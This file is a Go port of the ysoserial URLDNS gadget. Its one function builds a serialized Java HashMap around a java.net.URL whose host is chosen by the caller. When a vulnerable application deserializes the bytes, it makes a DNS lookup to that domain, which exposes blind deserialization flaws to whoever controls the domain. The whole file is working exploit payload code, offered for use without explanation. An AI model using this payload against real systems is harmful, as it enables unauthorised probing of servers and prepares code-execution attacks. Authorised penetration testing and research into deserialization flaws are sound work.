package ysoserial

func URLDNS(domain string) []byte {
	return ClassObject{
		name:             "java.util.HashMap",
		serialVersionUID: 362498820763181265,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 12},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
			&ClassObject{
				name:             "java.net.URL",
				serialVersionUID: -7627629688361524110,
				classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
				fields: []Field{
					{Integer, "hashCode", -1},
					{Integer, "port", -1},
					{"Ljava/lang/String;", "authority", domain},
					{"Ljava/lang/String;", "file", ""},
					{"Ljava/lang/String;", "host", domain},
					{"Ljava/lang/String;", "protocol", "http"},
					{"Ljava/lang/String;", "ref", nil},
				},
				objectAnnotations: interfaces(),
			},
			"http://"+domain,
		),
	}.SerializeWithMagicHeader()
}
